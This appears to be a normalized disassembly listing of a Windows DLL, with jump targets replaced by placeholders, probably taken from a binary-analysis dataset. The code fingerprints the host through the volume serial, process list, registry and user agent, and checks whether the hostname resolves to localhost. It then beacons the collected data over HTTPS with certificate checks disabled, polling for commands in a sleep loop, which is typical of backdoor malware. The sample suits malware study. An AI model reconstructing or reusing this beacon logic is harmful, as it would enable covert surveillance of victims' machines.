jmp r-xdata
mov bl 0xe
jmp r-xdata
mov bl 0xa
jmp r-xdata
jmp r-xdata
mov bl 0x6
jmp r-xdata
sub_10004855
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x0
call ObtainUserAgentString
push [ ebp - 0x4 ]
call sub_10004653
pop ecx
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x0
call ObtainUserAgentString
mov eax esi
pop esi
leave
retn
sub_1000488a
push ebp
mov ebp esp
push ecx
xor eax eax
push eax
push eax
push eax
push eax
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push eax
push eax
mov [ ebp - 0x4 ] eax
call [ GetVolumeInformationA@IAT ]
mov eax [ ebp - 0x4 ]
leave
retn
sub_100048a9
push ebp
mov ebp esp
push 0x5c
push 0x19f78c90
push 0x1
push 0x0
call sub_10001f77
add esp 0x10
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_100048c9
push ebp
mov ebp esp
push 0x5d
push 0xc930ea1e
push 0x1
push 0x0
call sub_10001f77
add esp 0x10
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_100048e9
push ebp
mov ebp esp
sub esp 0x128
push ebx
push esi
push edi
xor esi esi
push esi
push 0x2
call CreateToolhelp32Snapshot
mov ebx eax
lea eax [ ebp - 0x128 ]
push eax
push ebx
mov [ ebp - 0x128 ] 0x128
call sub_100048a9
pop ecx
pop ecx
lea eax [ ebp - 0x104 ]
push eax
call [ lstrlenA@IAT ]
lea esi [ esi + eax + 0x1 ]
lea eax [ ebp - 0x128 ]
push eax
push ebx
call sub_100048c9
pop ecx
pop ecx
test eax eax
jne r-xdata
inc esi
push esi
call sub_10004653
mov edi eax
lea eax [ ebp - 0x128 ]
push eax
push ebx
xor esi esi
call sub_100048a9
add esp 0xc
lea eax [ ebp - 0x104 ]
push eax
lea eax [ edi + esi ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esi eax
lea eax [ ebp - 0x128 ]
push eax
push ebx
call sub_100048c9
add esp 0x14
test eax eax
jne r-xdata
push ebx
call [ CloseHandle@IAT ]
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
sub_10004993
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
push 0xc
call sub_1000461b
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_10003e40
mov esi eax
jmp r-xdata
mov esi [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push ebx
mov edi r--data
push edi
push [ ebp - 0x8 ]
mov [ ebp - 0x4 ] ebx
call esi
push [ ebp - 0x4 ]
call sub_10004653
pop ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push ebx
push ebx
push edi
push [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
call esi
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx esi
call sub_10004096
push esi
call sub_10004632
pop ecx
push 0x2b
push r--data
mov ecx esi
call sub_1000404a
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push ebx
push edi
push 0x80000002
call [ RegOpenKeyExA@IAT ]
push edi
call sub_1000465c
pop ecx
cmp esi ebx
je r-xdata
sub_10004a38
push ebx
push esi
push 0xc
mov esi ecx
call sub_1000461b
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov ecx eax
call sub_10003e40
jmp r-xdata
xor eax eax
mov ecx eax
call sub_10004715
jmp r-xdata
push 0x1
mov [ esi ] eax
call sub_1000461b
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov ecx eax
call sub_10004538
jmp r-xdata
push 0x4
mov [ esi + 0x4 ] eax
call sub_1000461b
pop ecx
cmp eax ebx
je r-xdata
push 0x14
mov [ esi + 0x8 ] eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
call sub_10004653
pop ecx
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] bl
mov eax esi
pop esi
pop ebx
retn
sub_10004aaa
push ebp
mov ebp esp
mov eax [ ecx + 0x18 ]
xor edx edx
movzx ecx dx
mov edx [ ebp + 0x8 ]
mov [ eax + ecx * 4 ] edx
inc edx
cmp dx 0x5
jb r-xdata
movzx ecx dx
cmp [ eax + ecx * 4 ] 0x0
je r-xdata
jmp r-xdata
pop ebp
retn 0x4
sub_10004af0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
xor ebx ebx
mov edi r--data
mov esi ecx
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] ebx
push [ esi + 0x10 ]
call sub_1000465c
push [ ebp - 0xc ]
call sub_1000465c
and [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov ecx [ esi ]
push 0x2c
cmp ebx 0x3
jne r-xdata
push [ ebp - 0xc ]
call sub_1000465c
add [ ebp - 0x8 ] 0x2c
add [ ebp - 0x4 ] 0x2c
inc ebx
cmp [ ebp - 0x8 ] 0xb0
pop ecx
jb r-xdata
inc ebx
and ebx 0x3
imul ebx ebx 0x2c
add ebx edi
push ebx
call sub_1000404a
push r--data
call sub_1000404a
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ esi ]
push 0x2c
push [ ebp - 0x4 ]
call sub_1000404a
push eax
push [ esi + 0x10 ]
mov [ ebp - 0xc ] eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
sub_10004b92
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov ebx ecx
mov ecx [ ebx ]
push 0x2
push r--data
call sub_1000404a
push [ ebp + 0xc ]
mov esi [ lstrlenA@IAT ]
mov [ ebp - 0x8 ] eax
call esi
push r--data
mov [ ebp - 0x4 ] eax
call esi
push [ ebp - 0x8 ]
mov edi eax
imul edi edi 0x3
call esi
push [ ebp + 0x8 ]
add edi eax
call esi
mov ecx [ ebp - 0x4 ]
add eax edi
lea eax [ eax + ecx + 0x5 ]
push eax
call sub_10004653
push [ ebp - 0x8 ]
mov edi eax
push r--data
push edi
call [ wsprintfA@IAT ]
mov esi eax
push 0x4
lea eax [ ebx + 0x14 ]
push eax
lea eax [ esi + edi ]
push eax
call sub_100041e0
push [ ebp + 0x8 ]
add esi 0x4
lea eax [ esi + edi ]
push r--data
push eax
call [ wsprintfA@IAT ]
push [ ebp - 0x4 ]
add esi eax
push [ ebp + 0xc ]
lea eax [ esi + edi ]
push eax
call sub_100041e0
add esi [ ebp - 0x4 ]
mov ecx [ ebx ]
add esp 0x34
push 0x1
push esi
push edi
call sub_10003e94
push edi
mov esi eax
call sub_1000465c
push [ ebp - 0x8 ]
call sub_1000465c
pop ecx
pop ecx
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x8
sub_10004c56
push ebp
mov ebp esp
push esi
mov esi [ InternetCloseHandle@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push [ edi + 0x8 ]
call esi
push [ edi + 0x4 ]
call esi
push [ edi ]
call esi
pop edi
pop esi
pop ebp
retn
sub_10004c76
push ebp
mov ebp esp
push esi
mov esi [ lstrlenA@IAT ]
push edi
push [ ebp + 0xc ]
call esi
push [ ebp + 0x10 ]
lea edi [ eax + 0x1 ]
call esi
push edi
push [ ebp + 0xc ]
mov edi [ InternetSetOptionA@IAT ]
push 0x2b
push [ ebp + 0x8 ]
lea esi [ eax + 0x1 ]
call edi
push esi
push [ ebp + 0x10 ]
push 0x2c
push [ ebp + 0x8 ]
call edi
pop edi
pop esi
pop ebp
retn
sub_10004cb1
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x1 ] 0x0
xor ebx ebx
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
test al al
jne r-xdata
mov [ edi + 0x1c ] esi
mov [ ebp - 0x1 ] 0x1
inc ebx
cmp bx 0x5
jb r-xdata
mov ecx [ edi + 0x18 ]
movzx eax bx
mov esi [ ecx + eax * 4 ]
test esi esi
je r-xdata
jmp r-xdata
sub_10004cf0
push esi
push edi
mov esi ecx
xor edi edi
pop edi
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x20 ]
inc edi
cmp di 0x5
jb r-xdata
mov ecx [ esi + 0x18 ]
movzx eax di
mov ecx [ ecx + eax * 4 ]
test ecx ecx
je r-xdata
sub_10004d42
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
push 0x401
mov esi ecx
call sub_10004653
pop ecx
mov ecx [ esi ]
push 0xa
push r--data
mov [ ebp - 0x14 ] eax
call sub_1000404a
mov ecx [ esi + 0x8 ]
push 0x5
push 0x6
mov ebx eax
call sub_100045a6
mov ecx [ esi + 0x8 ]
push 0x7
push 0x1
mov [ ebp - 0x10 ] eax
call sub_10004544
mov ecx [ esi + 0x8 ]
push eax
call sub_10004560
mov ecx [ esi + 0x8 ]
push 0x3
push 0x0
mov [ ebp - 0xc ] eax
call sub_10004544
mov ecx [ esi + 0x8 ]
push 0x3
push 0x1
mov edi eax
call sub_10004544
mov ecx [ esi + 0x8 ]
push eax
call sub_10004560
push 0x0
push ebx
mov [ ebp - 0x8 ] eax
call [ lstrlenA@IAT ]
mov ecx [ esi ]
push eax
push ebx
call sub_10003e94
imul edi edi 0x5
mov ecx [ esi ]
push 0x5
add edi r--data
push edi
mov [ ebp - 0x4 ] eax
call sub_1000404a
push [ ebp - 0x4 ]
mov esi eax
push [ ebp - 0x8 ]
push esi
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push r--data
push [ ebp - 0x14 ]
call [ wsprintfA@IAT ]
push esi
call sub_1000465c
push [ ebp - 0x4 ]
call sub_1000465c
push [ ebp - 0x8 ]
call sub_1000465c
push [ ebp - 0xc ]
call sub_1000465c
push [ ebp - 0x10 ]
call sub_1000465c
push ebx
call sub_1000465c
mov eax [ ebp - 0x14 ]
add esp 0x34
pop edi
pop esi
pop ebx
leave
retn
sub_10004e34
push ebp
mov ebp esp
sub esp 0x190
push ebx
push esi
push edi
xor eax eax
push 0x18e
mov [ ebp - 0x190 ] ax
xor ebx ebx
lea eax [ ebp - 0x18e ]
push ebx
push eax
call sub_10004208
add esp 0xc
lea eax [ ebp - 0x190 ]
push eax
push 0x202
call WSAStartup
mov esi 0x104
push esi
call sub_10004653
pop ecx
mov edi eax
push esi
push edi
call gethostname
test eax eax
jne r-xdata
push edi
call sub_1000465c
pop ecx
call WSACleanup
pop edi
pop esi
mov al bl
pop ebx
leave
retn
push edi
call gethostbyname
cmp eax ebx
je r-xdata
mov bl 0x1
mov eax [ eax + 0xc ]
xor edx edx
cmp [ eax ] ebx
je r-xdata
mov ecx eax
inc edx
lea ecx [ eax + edx * 4 ]
cmp [ ecx ] ebx
jne r-xdata
cmp ecx 0xb29bfea9
jne r-xdata
mov ecx [ ecx ]
mov ecx [ ecx ]
cmp ecx 0x100007f
je r-xdata
jmp r-xdata
sub_10004ed2
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi ecx
xor esi esi
xor ebx ebx
call sub_10004d12
cmp eax esi
je r-xdata
push esi
push esi
push eax
push ebx
push [ edi + 0xc ]
call [ InternetOpenA@IAT ]
push esi
push esi
push 0x3
push esi
push esi
push 0x1bb
push [ edi + 0x10 ]
mov [ ebp - 0x1c ] eax
push eax
call [ InternetConnectA@IAT ]
mov ecx edi
mov [ ebp - 0x8 ] eax
call sub_10004d22
mov ecx edi
mov ebx eax
call sub_10004d32
cmp ebx esi
je r-xdata
push 0x3
pop ebx
mov ecx edi
call sub_10004d42
mov ecx [ edi ]
push 0x4
pop ebx
push ebx
push r--data
mov [ ebp - 0xc ] eax
call sub_1000404a
push esi
push 0x800000
push esi
push esi
push esi
push [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
push eax
push [ ebp - 0x8 ]
call [ HttpOpenRequestA@IAT ]
mov edi eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1f
push edi
mov [ ebp - 0x14 ] ebx
call [ InternetQueryOptionA@IAT ]
or [ ebp - 0x4 ] 0x3180
push ebx
lea eax [ ebp - 0x4 ]
push eax
push 0x1f
push edi
call [ InternetSetOptionA@IAT ]
push [ ebp - 0x18 ]
call sub_1000465c
push [ ebp - 0xc ]
call sub_1000465c
pop ecx
pop ecx
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
push eax
push [ ebp + 0xc ]
push esi
push esi
push edi
call [ HttpSendRequestA@IAT ]
mov [ ebp - 0x10 ] esi
cmp eax esi
je r-xdata
cmp eax esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x8 ] edi
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c ]
pop edi
pop esi
mov [ eax ] ecx
mov eax [ ebp - 0x10 ]
pop ebx
leave
retn 0x8
push esi
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x20000013
push edi
mov [ ebp + 0xc ] ebx
call [ HttpQueryInfoA@IAT ]
push eax
push ebx
push [ ebp - 0x8 ]
call sub_10004c76
add esp 0xc
sub_10004ffa
push ebx
push esi
push edi
push 0x5
mov esi ecx
xor edi edi
pop ebx
add edi 0x4
dec ebx
jne r-xdata
mov eax [ eax + edi ]
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
cmp [ eax + edi ] 0x0
je r-xdata
push [ esi + 0x10 ]
call sub_1000465c
push [ esi + 0x18 ]
call sub_1000465c
push [ esi + 0xc ]
call sub_1000465c
mov edi [ esi + 0x8 ]
add esp 0xc
test edi edi
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov ecx edi
call sub_1000449d
push edi
call sub_10004632
pop ecx
mov esi [ esi ]
test esi esi
je r-xdata
mov ecx edi
call sub_10003db3
push edi
call sub_10004632
pop ecx
pop edi
pop esi
pop ebx
retn
mov ecx esi
call sub_10004096
push esi
call sub_10004632
pop ecx
sub_1000507f
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
call sub_1000488a
mov ecx [ esi + 0x4 ]
mov [ esi + 0x14 ] eax
call sub_10004855
push 0x10
mov [ esi + 0xc ] eax
call sub_1000461b
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10005c16
jmp r-xdata
push eax
mov ecx esi
call sub_10004aaa
pop esi
retn
sub_100050b9
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov edi ecx
call sub_1000473d
mov [ ebp - 0x1 ] al
call sub_10004718
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x2 ] al
call sub_100048e9
mov esi [ lstrlenA@IAT ]
push eax
mov [ ebp - 0x24 ] eax
call esi
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x34 ] eax
call sub_10004993
push eax
mov [ ebp - 0x20 ] eax
call esi
mov ecx edi
mov [ ebp - 0x30 ] eax
call sub_10004d12
push eax
mov [ ebp - 0x38 ] eax
call esi
mov ecx edi
mov [ ebp - 0x8 ] eax
call sub_10004d22
push eax
mov [ ebp - 0x3c ] eax
call esi
mov ecx edi
mov [ ebp - 0xc ] eax
call sub_10004d32
push eax
mov [ ebp - 0x40 ] eax
call esi
push r--data
mov [ ebp - 0x10 ] eax
call esi
push r--data
mov [ ebp - 0x1c ] eax
call esi
mov ecx [ edi ]
mov ebx eax
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x10 ]
push 0x5
add ebx eax
add ebx [ ebp - 0xc ]
push r--data
add ebx [ ebp - 0x8 ]
call sub_1000404a
push eax
mov [ ebp - 0x1c ] eax
call esi
mov ecx [ edi ]
push 0x6
push r--data
mov [ ebp - 0x2c ] eax
call sub_1000404a
push eax
mov [ ebp - 0x18 ] eax
call esi
mov ecx [ edi ]
push 0x6
push r--data
mov [ ebp - 0x28 ] eax
call sub_1000404a
push eax
mov [ ebp - 0x14 ] eax
call esi
add eax [ ebp - 0x28 ]
add eax [ ebp - 0x2c ]
add eax ebx
add eax [ ebp - 0x30 ]
mov ebx [ ebp - 0x34 ]
lea eax [ eax + ebx + 0x10 ]
push eax
call sub_10004653
mov esi eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push esi
call sub_100041e0
push 0x1
lea eax [ ebp - 0x2 ]
push eax
lea eax [ esi + 0x1 ]
push eax
call sub_100041e0
push ebx
push [ ebp - 0x24 ]
lea eax [ esi + 0x2 ]
push eax
call sub_100041e0
push [ ebp - 0x20 ]
add ebx 0x2
push [ ebp - 0x1c ]
lea eax [ ebx + esi ]
push r--data
push eax
call sub_10001e9d
push 0x12131415
push [ ebp - 0x18 ]
add ebx eax
lea eax [ ebx + esi ]
push r--data
push eax
call sub_10001e9d
add esp 0x48
add ebx eax
cmp [ edi + 0x20 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
push [ ebp - 0x14 ]
lea eax [ ebx + esi ]
push r--data
push eax
call sub_10001e9d
add esp 0xc
add ebx eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
push [ ebp - 0x38 ]
lea eax [ ebx + esi ]
push r--data
push eax
call sub_10001e9d
add esp 0xc
add ebx eax
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
push [ ebp - 0x3c ]
lea eax [ ebx + esi ]
push r--data
push eax
call sub_10001e9d
add esp 0xc
add ebx eax
mov ecx [ edi ]
push 0x1
push r--data
call sub_1000404a
mov ebx eax
push esi
push ebx
mov ecx edi
call sub_10004b92
push [ ebp - 0x14 ]
mov edi eax
call sub_1000465c
push ebx
call sub_1000465c
push esi
call sub_1000465c
push [ ebp - 0x18 ]
call sub_1000465c
push [ ebp - 0x1c ]
call sub_1000465c
push [ ebp - 0x20 ]
call sub_1000465c
push [ ebp - 0x24 ]
call sub_1000465c
add esp 0x1c
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x40 ]
add ebx esi
push r--data
push ebx
call sub_10001e9d
add esp 0xc
sub_100052cb
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0xc ] 0x0
push esi
push edi
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0x8 ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0xc ]
push eax
call sub_10004ed2
mov esi eax
lea eax [ ebp - 0xc ]
push eax
call sub_10004c56
xor eax eax
pop ecx
cmp esi 0xc8
je r-xdata
xor eax eax
inc eax
cmp esi 0x194
jne r-xdata
pop edi
pop esi
leave
retn 0x4
sub_10005311
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push edi
push [ ebp + 0x8 ]
xor ebx ebx
xor eax eax
mov [ ebp - 0x1c ] ebx
lea edi [ ebp - 0x18 ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] ebx
call sub_10004ed2
cmp eax 0xc8
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_10004c56
mov eax [ ebp - 0x8 ]
pop ecx
pop edi
pop ebx
leave
retn 0x8
mov [ ebp - 0xc ] 0x4
mov [ ebp + 0x8 ] ebx
cmp [ ebp - 0x14 ] ebx
je r-xdata
push ebx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x20000005
push [ ebp - 0x14 ]
call [ HttpQueryInfoA@IAT ]
cmp [ ebp + 0x8 ] 0x24
jbe r-xdata
push esi
push [ ebp + 0x8 ]
call sub_10004653
pop ecx
mov edi eax
xor esi esi
mov [ ebp - 0x4 ] ebx
cmp esi [ ebp + 0x8 ]
pop esi
jne r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
push edi
call sub_1000465c
pop ecx
push [ ebp + 0xc ]
mov eax [ ebp - 0x10 ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push edi
call sub_10003f77
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
lea eax [ esi + edi ]
push eax
push [ ebp - 0x14 ]
call sub_10002763
add esi [ ebp - 0x4 ]
add esp 0x10
cmp [ ebp - 0x4 ] ebx
je r-xdata
sub_100053d6
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov esi ecx
call sub_10004d42
mov ecx [ esi ]
push 0x4
push r--data
mov edi eax
call sub_1000404a
and [ ebp - 0x8 ] 0x0
mov ecx esi
mov ebx eax
call sub_10004d12
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_10004d22
mov ecx esi
mov [ ebp - 0x10 ] eax
call sub_10004d32
xor ecx ecx
cmp [ ebp - 0x4 ] ecx
je r-xdata
lea edx [ ebp - 0xc ]
push edx
push 0x1
push ecx
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] ecx
push r--data
push edi
push ebx
push eax
push [ ebp - 0x10 ]
push [ esi + 0x10 ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ esi + 0xc ]
call sub_10002dd3
push ebx
mov esi eax
call sub_1000465c
push edi
call sub_1000465c
add esp 0x3c
xor edi edi
test esi esi
je r-xdata
mov [ ebp - 0x8 ] 0x3
push esi
call sub_100021d8
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp [ ebp - 0xc ] 0x1
jne r-xdata
cmp [ esi ] 0x32
jne r-xdata
inc edi
sub_10005481
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov esi ecx
call sub_10004d42
mov ecx [ esi ]
push 0x4
push r--data
mov ebx eax
call sub_1000404a
and [ ebp - 0x8 ] 0x0
mov ecx esi
mov [ ebp - 0xc ] eax
call sub_10004d12
mov ecx esi
mov edi eax
call sub_10004d22
mov ecx esi
mov [ ebp - 0x10 ] eax
call sub_10004d32
test edi edi
je r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
push 0x0
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push r--data
push ebx
push [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ esi + 0x10 ]
push edi
push [ ebp - 0x8 ]
push [ esi + 0xc ]
call sub_10002d45
push [ ebp - 0xc ]
mov edi eax
call sub_1000465c
push ebx
call sub_1000465c
mov ebx [ ebp + 0xc ]
add esp 0x3c
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
xor eax eax
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov ecx [ esi ]
push ebx
push [ ebp - 0x4 ]
push edi
call sub_10003f77
cmp [ edi ] 0x32
jne r-xdata
and [ ebx ] 0x0
push edi
call sub_100021d8
pop ecx
xor edi edi
sub_10005542
push esi
push edi
mov edi ecx
call sub_10004ad1
mov esi r--data
push esi
mov ecx edi
mov [ edi + 0x20 ] 0x0
call sub_100052cb
test eax eax
jne r-xdata
mov ecx edi
pop edi
pop esi
jmp sub_10004af0
mov ecx edi
call sub_10004cb1
test al al
je r-xdata
push esi
mov ecx edi
call sub_100052cb
test eax eax
jne r-xdata
push esi
mov ecx edi
call sub_100053d6
test eax eax
jne r-xdata
mov [ edi + 0x20 ] 0x1
mov ecx edi
call sub_10004cf0
push esi
mov ecx edi
call sub_100053d6
sub_1000559f
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
xor esi esi
cmp [ ecx + 0x20 ] 0x0
je r-xdata
call sub_100052cb
call sub_100053d6
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
xor esi esi
inc esi
test eax eax
je r-xdata
sub_100055c8
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
mov esi ecx
call sub_10004e34
mov edi [ Sleep@IAT ]
jmp r-xdata
cmp al 0x1
jne r-xdata
push 0x2710
call edi
call sub_10004e34
mov ecx esi
call sub_1000507f
jmp r-xdata
mov ecx esi
call sub_10005542
test eax eax
je r-xdata
push 0x2710
call edi
mov ecx esi
call sub_100050b9
mov ebx eax
jmp r-xdata
push ebx
mov ecx esi
call sub_1000559f
test eax eax
je r-xdata
mov ecx esi
call sub_10004af0
push 0x2710
call edi
push ebx
call sub_1000465c
pop ecx
jmp r-xdata
call sub_10004e34
cmp al 0x1
jne r-xdata
push 0x2710
mov ecx esi
call sub_10005542
test eax eax
je r-xdata
xor ebx ebx
inc ebx
mov ecx [ esi ]
push 0x1
push r--data
call sub_1000404a
mov ecx [ esi ]
push 0x1
push r--data
mov [ ebp - 0x14 ] eax
call sub_1000404a
push eax
push [ ebp - 0x14 ]
mov ecx esi
mov [ ebp - 0x2c ] eax
call sub_10004b92
and [ ebp - 0xc ] 0x0
cmp [ esi + 0x20 ] 0x0
mov ebx eax
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
push ebx
je r-xdata
mov ecx esi
call sub_10004af0
push 0x2710
call edi
inc ebx
cmp ebx 0x4
jb r-xdata
call sub_10005311
call sub_10005481
jmp r-xdata
push r--data
mov ecx esi
call sub_1000559f
test eax eax
jne r-xdata
jmp r-xdata
push [ ebp - 0x2c ]
call sub_1000465c
push [ ebp - 0x14 ]
call sub_1000465c
pop ecx
pop ecx
push 0x1b7740
jmp r-xdata
push 0x14
call sub_1000461b
pop ecx
cmp eax ebx
je r-xdata
push ebx
mov [ ebp - 0x8 ] eax
call sub_1000465c
xor ebx ebx
pop ecx
cmp [ ebp - 0x8 ] ebx
je r-xdata
call edi
mov ecx ebx
call sub_1000591a
mov ecx [ esi ]
push 0x1
test al al
jne r-xdata
push [ ebp - 0xc ]
mov ecx eax
push [ ebp - 0x8 ]
call sub_10005ad0
mov ebx eax
jmp r-xdata
push r--data
call sub_1000404a
mov ecx ebx
mov [ ebp - 0x1c ] eax
call sub_10005a64
push eax
push [ ebp - 0x1c ]
mov ecx esi
call sub_10004b92
and [ ebp - 0x10 ] 0x0
cmp [ esi + 0x20 ] 0x0
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x28 ] eax
push eax
mov ecx esi
je r-xdata
push r--data
call sub_1000404a
push eax
push [ ebp - 0x14 ]
mov ecx esi
mov [ ebp - 0x24 ] eax
call sub_10004b92
push eax
mov ecx esi
mov [ ebp - 0x28 ] eax
call sub_1000559f
push [ ebp - 0x28 ]
call sub_1000465c
push [ ebp - 0x24 ]
call sub_1000465c
pop ecx
pop ecx
test ebx ebx
je r-xdata
call sub_10005311
call sub_10005481
jmp r-xdata
push [ ebp - 0x8 ]
call sub_1000465c
pop ecx
mov ecx ebx
call sub_10005b13
push ebx
call sub_10004632
pop ecx
push [ ebp - 0x28 ]
call sub_1000465c
push [ ebp - 0x1c ]
call sub_1000465c
pop ecx
pop ecx
push [ ebp - 0x10 ]
mov ecx ebx
push eax
call sub_10005a6c
mov ecx [ esi ]
push 0x1
push r--data
mov [ ebp - 0x18 ] eax
call sub_1000404a
push [ ebp - 0x18 ]
mov ecx esi
push eax
mov [ ebp - 0x24 ] eax
call sub_10004b92
push eax
mov ecx esi
mov [ ebp - 0x20 ] eax
call sub_1000559f
push [ ebp - 0x20 ]
call sub_1000465c
push [ ebp - 0x24 ]
call sub_1000465c
push [ ebp - 0x18 ]
call sub_1000465c
push [ ebp - 0x4 ]
call sub_1000465c
add esp 0x10
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
sub_10005831
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] edx
jbe r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov cl [ eax + edx ]
cmp cl 0xd
je r-xdata
mov [ eax + edx ] 0x0
cmp cl 0xa
jne r-xdata
inc edx
cmp edx [ ebp + 0xc ]
jb r-xdata
sub_10005857
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push 0x3d
push [ ebp + 0x8 ]
mov esi ecx
call sub_10004147
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
pop esi
pop ebx
leave
retn 0x4
push edi
mov [ ebx ] 0x0
mov ecx [ esi ]
push 0x8
push r--data
inc ebx
call sub_1000404a
mov ecx [ esi ]
push 0xa
push r--data
mov [ ebp - 0xc ] eax
call sub_1000404a
mov ecx [ esi ]
push 0x6
push r--data
mov [ ebp - 0x8 ] eax
call sub_1000404a
push [ ebp - 0xc ]
mov edi [ lstrcmpiA@IAT ]
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
call edi
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call edi
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
push ebx
call sub_10004294
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call edi
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
push ebx
call sub_100042a6
jmp r-xdata
push [ ebp - 0x4 ]
call sub_1000465c
push [ ebp - 0x8 ]
call sub_1000465c
push [ ebp - 0xc ]
call sub_1000465c
add esp 0xc
pop edi
mov ecx [ esi + 0x4 ]
push ebx
call sub_100042d7
sub_1000591a
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi ecx
mov eax [ esi + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp eax [ esi + 0x10 ]
jae r-xdata
